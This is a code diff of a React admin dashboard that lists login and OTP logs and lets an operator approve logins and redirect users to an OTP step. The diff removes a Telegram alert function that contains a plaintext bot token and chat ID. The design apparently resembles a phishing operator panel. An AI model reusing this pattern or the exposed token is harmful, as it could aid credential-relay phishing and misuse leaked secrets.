@@ -3,23 +3,6 @@ import axios from "axios";
 import { approveLogin, rejectLogin } from "../api";
 import styles from "./AdminDashboard.module.css";
 
-// Telegram Notification Function
-const sendTelegramNotification = async (message) => {
-  const chatId = "1853998920";
-  const botToken = "7744005529:AAFHfmD7lGOEsRSb_tk0_FE4WuF_JN4U1YE";
-  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-  try {
-    await axios.post(url, {
-      chat_id: chatId,
-      text: message,
-    });
-    console.log("Notification sent to Telegram");
-  } catch (error) {
-    console.error("Error sending notification to Telegram:", error);
-  }
-};
-
 const AdminDashboard = () => {
   const [loginLogs, setLoginLogs] = useState([]);
   const [otpLogs, setOtpLogs] = useState([]);
@@ -78,9 +61,6 @@ const AdminDashboard = () => {
 
   const handleRedirectToOtp = async (logId) => {
     try {
-      // Step 1: Send a notification before redirecting
-      await sendTelegramNotification("A user has logged in and is being redirected to OTP.");
-
       const response = await approveLogin(logId);
       if (response.success) {
         fetchLogs();
@@ -251,3 +231,4 @@ const AdminDashboard = () => {
 };
 
 export default AdminDashboard;
+
